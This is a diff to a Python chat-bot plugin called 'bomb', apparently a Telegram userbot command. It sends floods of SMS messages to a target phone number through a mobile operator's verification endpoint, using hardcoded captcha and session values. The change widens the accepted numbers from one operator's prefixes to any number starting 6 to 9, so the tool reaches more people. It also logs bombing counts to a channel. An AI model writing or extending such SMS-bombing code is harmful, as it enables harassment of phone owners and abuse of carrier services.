@@ -23,8 +23,8 @@ async def bomb(message: Message):
         await message.edit("Enter a number!")
         return
 
-    if str(num)[:3] in ['984', '985', '986']:
-        await message.edit("`Ntc Number Detected!`")
+    if str(num)[:1] in ['6', '7', '8', '9']:
+        await message.edit("`Number Detected!`")
         sleep(2)
         paramss={"webcaptcha":"2iBVFrLWrrezxoeI5u8duQpznGcudpxBQZM88Daf7ram7luqVkVKe8rsVxpM4nVunuNg7pGQ6Bb5jaUZdJnvkKXBn8nWBG890VRebIOsZM4%3D","JSESSIONID":"3854CCA90376DB14C75841F35A548032","2":"11","userName":num,"codeType":"1"}
         await message.edit("`Bombing Number....`")
@@ -49,7 +49,7 @@ async def bomb(message: Message):
         await message.edit(f"`Bombed {n} SMS.\nNumber: {num}\nOperator: Ncell\nPlugin Credit: Detective`")
         await CHANNEL.log(f"Bombed {n} SMS.\nNumber: {num}\nOperator: Ncell\nPlugin Credit: Detective")
     else:
-        await message.edit('`Enter Ntc/Ncell Number Randi`')
+        await message.edit('`Enter Valid Number`')
         await CHANNEL.log(f"Couldn't Bomb to {num}\nReason: Invalid Number Detected\nApi Credit: Detective")
         return
 
